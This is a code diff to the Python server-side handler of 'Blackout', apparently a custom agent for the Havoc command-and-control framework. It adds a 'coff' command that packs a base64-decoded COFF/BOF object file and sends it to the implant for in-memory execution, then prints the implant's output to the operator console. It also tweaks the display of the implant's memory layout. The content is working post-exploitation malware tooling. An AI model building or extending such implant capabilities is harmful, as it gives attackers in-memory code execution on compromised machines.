@@ -4,6 +4,7 @@ from havoc.agent import *
 
 import os
 
+CMD_COFFLOADER           = 0x500
 BLACKOUT_ERROR           = 0x099
 BLACKOUT_DEBUG           = 0x066
 BLACKOUT_CHECKIN         = 0x055
@@ -56,6 +57,31 @@ class CommandCheckin( Command ):
 
         return Task.buffer
     
+class CommandCoffLdr( Command ):
+    CommandId   = CMD_COFFLOADER
+    Name        = "coff"
+    Description = "execute coff/bof in memory"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = [
+        CommandParam(
+            name="path_to_coff",
+            is_file_path=True,
+            is_optional=False
+        )
+    ]
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        buffer = b64decode( arguments[ 'path_to_coff' ] )
+
+        Task.add_int( self.CommandId )
+        Task.add_data( buffer )
+
+        return Task.buffer
+
 class CommandProcEnum( Command ):
     CommandId   = COMMAND_PROCLIST
     Name        = "process_list"
@@ -296,6 +322,7 @@ class Blackout(AgentType):
     Commands = [
         CommandCheckin(),
         CommandMemoryAlloc(),
+        CommandCoffLdr(),
         CommandProcEnum(),
         CommandClassic(),
         CommandRun(),
@@ -430,6 +457,12 @@ class Blackout(AgentType):
                 Output = response_parser.parse_str()
                 self.console_message( AgentID, "Good", "%s\n", "" )
 
+            elif Command == CMD_COFFLOADER:
+                Output = response_parser.parse_bytes()
+                decoded_str = Output.decode('utf-8', errors='replace')  # Substitui caracteres não-ASCII por "�"
+                print(decoded_str)
+                self.console_message( AgentID, "Good", "Received output:", decoded_str )
+
             elif Command == COMMAND_OUTPUT:
 
                 Output = response_parser.parse_str()
@@ -465,10 +498,9 @@ class Blackout(AgentType):
                 Output = (
                     f"Blackout memory config:\n"
                     f"\t=> Base Address: 0x{bk_base:X}\n"
-                    f"\t=> Length: {bk_len} | 0x{bk_len:X} bytes\n"
-                    f"\t=> Full Length: {bk_fullen} | 0x{bk_fullen:X} bytes\n"
-                    f"\t=> RX Base Address: 0x{bk_rxbase:X}\n"
-                    f"\t=> RX Size: {bk_rxsize} | 0x{bk_rxsize:X} bytes\n"
+                    f"\t=> Length: {bk_len} [0x{bk_len:X}] bytes\n"
+                    f"\t=> RX Base Address: 0x{bk_rxbase:X} [0x{bk_rxsize:X} bytes]\n"
+                    f"\t=> RX Size: {bk_rxsize} | \n"
                     
                     f"\nProcess informations:\n"
                     f"\t=> Process Name: {proc_name}\n"
